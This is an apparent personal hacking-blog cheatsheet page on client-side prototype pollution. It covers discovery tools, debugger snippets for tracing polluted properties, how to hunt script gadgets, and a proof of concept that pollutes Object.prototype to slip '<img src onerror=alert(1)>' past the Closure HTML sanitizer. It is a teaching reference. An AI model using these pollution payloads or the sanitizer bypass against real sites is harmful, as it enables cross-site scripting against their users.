<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Client Side Prototype Pollution | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⚛️</text></svg>" > <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/hacking/cheetsheets/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">~|h0m3|~ </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">~|bl0g|~ </a> </li> <li class="nav-item active"> <a class="nav-link" href="/hacking/">~|h4Ck1n6|~ <span class="sr-only">(current)</span> </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">~|m0Re|~ </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/repos/">repositories</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/misc/">miscelanea</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/cv/">Cv</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"><div class="post"> <header class="post-header"> <h1 class="post-title">Client Side Prototype Pollution</h1> <p class="post-description"></p> </header> <article> <h2 id="discovering-using-automatic-tools">Discovering using Automatic tools</h2> <p>The tools <a href="https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0"><strong>https://github.com/dwisiswant0/ppfuzz</strong></a><strong>,</strong> <a href="https://github.com/kleiton0x00/ppmap"><strong>https://github.com/kleiton0x00/ppmap</strong></a> <strong>and</strong> <a href="https://github.com/kosmosec/proto-find"><strong>https://github.com/kosmosec/proto-find</strong></a> can be used to <strong>find prototype pollution vulnerabilities</strong>.</p> <p>Moreover, you could also use the <strong>browser extension</strong> <a href="https://github.com/msrkp/PPScan"><strong>PPScan</strong></a> to <strong>automatically</strong> <strong>scan</strong> the <strong>pages</strong> you <strong>access</strong> for prototype pollution vulnerabilities.</p> <h3 id="debugging-where-a-property-is-used-">Debugging where a property is used <a href="#id-5530" id="id-5530"></a></h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Stop debugger where 'potentialGadget' property is accessed</span>
<span class="nb">Object</span><span class="p">.</span><span class="nf">defineProperty</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="dl">"</span><span class="s2">potentialGadget</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
  <span class="na">__proto__</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="nf">get</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">trace</span><span class="p">();</span>
    <span class="k">return</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">;</span>
  <span class="p">},</span>
<span class="p">});</span>
</code></pre></div></div> <h3 id="finding-the-root-cause-of-prototype-pollution-">Finding the root cause of Prototype Pollution <a href="#id-5530" id="id-5530"></a></h3> <p>Once a prototype pollution vulnerability has been identified by any of the tools, and if the code is not overly complex, you might find the vulnerability by searching for keywords such as <code class="language-plaintext highlighter-rouge">location.hash</code>, <code class="language-plaintext highlighter-rouge">decodeURIComponent</code>, or <code class="language-plaintext highlighter-rouge">location.search</code> in the Chrome Developer Tools. This approach allows you to pinpoint the vulnerable section of the JavaScript code.</p> <p>For larger and more complex codebases, a straightforward method to discover the vulnerable code involves the following steps:</p> <ol> <li>Use a tool to identify a vulnerability and obtain a payload designed to set a property in the constructor. An example provided by ppmap might look like: <code class="language-plaintext highlighter-rouge">constructor[prototype][ppmap]=reserved</code>.</li> <li>Set a breakpoint at the first line of JavaScript code that will execute on the page. Refresh the page with the payload, pausing the execution at this breakpoint.</li> <li>While the JavaScript execution is paused, execute the following script in the JS console. This script will signal when the ‘ppmap’ property is created, aiding in locating its origin:</li> </ol> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">debugAccess</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">prop</span><span class="p">,</span> <span class="nx">debugGet</span> <span class="o">=</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">origValue</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">prop</span><span class="p">];</span>

  <span class="nb">Object</span><span class="p">.</span><span class="nf">defineProperty</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">prop</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">get</span><span class="p">:</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">debugGet</span><span class="p">)</span> <span class="k">debugger</span><span class="p">;</span>
      <span class="k">return</span> <span class="nx">origValue</span><span class="p">;</span>
    <span class="p">},</span>
    <span class="na">set</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">debugger</span><span class="p">;</span>
      <span class="nx">origValue</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
    <span class="p">},</span>
  <span class="p">});</span>
<span class="p">}</span>

<span class="nf">debugAccess</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">,</span> <span class="dl">"</span><span class="s2">ppmap</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div> <ol> <li>Navigate back to the <strong>Sources</strong> tab and select “Resume script execution”. The JavaScript will continue executing, and the ‘ppmap’ property will be polluted as expected. Utilizing the provided snippet facilitates the identification of the exact location where the ‘ppmap’ property is polluted. By examining the <strong>Call Stack</strong>, different stacks where the pollution occurred can be observed.</li> </ol> <p>When deciding which stack to investigate, it is often useful to target stacks associated with JavaScript library files, as prototype pollution frequently occurs within these libraries. Identify the relevant stack by examining its attachment to library files (visible on the right side, similar to an image provided for guidance). In scenarios with multiple stacks, such as those on lines 4 and 6, the logical choice is the stack on line 4, as it represents the initial occurrence of pollution and thereby the root cause of the vulnerability. Clicking on the stack will direct you to the vulnerable code.</p> <p>![https://miro.medium.com/max/1400/1<em>S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1</em>S8NBOl1a7f1zhJxlh-6g4w.jpeg)</p> <h2 id="finding-script-gadgets">Finding Script Gadgets</h2> <p>The gadget is the <strong>code that will be abused once a PP vulnerability is discovered</strong>.</p> <p>If the application is simple, we can <strong>search</strong> for <strong>keywords</strong> like <strong><code class="language-plaintext highlighter-rouge">srcdoc/innerHTML/iframe/createElement</code></strong> and review the source code and check if it l<strong>eads to javascript execution</strong>. Sometimes, mentioned techniques might not find gadgets at all. In that case, pure source code review reveals some nice gadgets like the below example.</p> <h3 id="example-finding-pp-gadget-in-mithil-library-code">Example Finding PP gadget in Mithil library code</h3> <p>Check this writeup: <a href="https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/">https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/</a></p> <h2 id="recompilation-of-payloads-for-vulnerable-libraries">Recompilation of payloads for vulnerable libraries</h2> <ul> <li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution</a></li> <li><a href="https://github.com/BlackFan/client-side-prototype-pollution">https://github.com/BlackFan/client-side-prototype-pollution</a></li> </ul> <h2 id="html-sanitizers-bypass-via-pp">HTML Sanitizers bypass via PP</h2> <p><a href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/"><strong>This research</strong></a> shows PP gadgets to use to <strong>bypass the sanizations</strong> provided by some HTML sanitizers libraries:</p> <ul> <li><strong>sanitize-html</strong></li> </ul> <figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"/><figcaption></figcaption></figure> <ul> <li><strong>dompurify</strong></li> </ul> <figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"/><figcaption></figcaption></figure> <ul> <li><strong>Closure</strong></li> </ul> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ --&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="dl">'</span><span class="s1">* ONERROR</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="dl">'</span><span class="s1">* SRC</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">https://google.github.io/closure-library/source/closure/goog/base.js</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="nx">goog</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">goog.html.sanitizer.HtmlSanitizer</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">goog</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">goog.dom</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="kd">const</span> <span class="nx">html</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">&lt;img src onerror=alert(1)&gt;</span><span class="dl">'</span><span class="p">;</span>
  <span class="kd">const</span> <span class="nx">sanitizer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">goog</span><span class="p">.</span><span class="nx">html</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nc">HtmlSanitizer</span><span class="p">();</span>
  <span class="kd">const</span> <span class="nx">sanitized</span> <span class="o">=</span> <span class="nx">sanitizer</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
  <span class="kd">const</span> <span class="nx">node</span> <span class="o">=</span> <span class="nx">goog</span><span class="p">.</span><span class="nx">dom</span><span class="p">.</span><span class="nf">safeHtmlToNode</span><span class="p">(</span><span class="nx">sanitized</span><span class="p">);</span>

  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nx">node</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h2 id="references">References</h2> <ul> <li><a href="https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746">https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746</a></li> <li><a href="https://blog.s1r1us.ninja/research/PP">https://blog.s1r1us.ninja/research/PP</a></li> <li><a href="https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/">https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has</a></li> </ul> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> &copy; Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>